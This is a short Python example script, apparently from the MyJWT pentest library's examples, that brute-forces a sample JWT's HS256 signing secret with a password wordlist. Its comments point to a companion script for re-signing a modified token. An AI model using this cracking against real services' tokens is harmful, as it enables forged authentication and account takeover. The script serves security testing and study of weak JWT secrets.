from MyJWT.vulnerabilities import bruteforceDict

jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
# Header: {"typ": "JWT", "alg": "HS256"}
# Payload: {"user": null}
# Signature: "Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
wordlist = "../../wordlist/common_pass.txt"
# wordlist is path file of your dict (format: txt, 1 line = 1 password)
key = bruteforceDict(jwt, wordlist)
# key is secret key used for signature
# return is a key or "" if bruteforce failed
# if you get a key use 03-sign-key script for modify your jwt then re-sign your jwt with the secret key key
print(key)
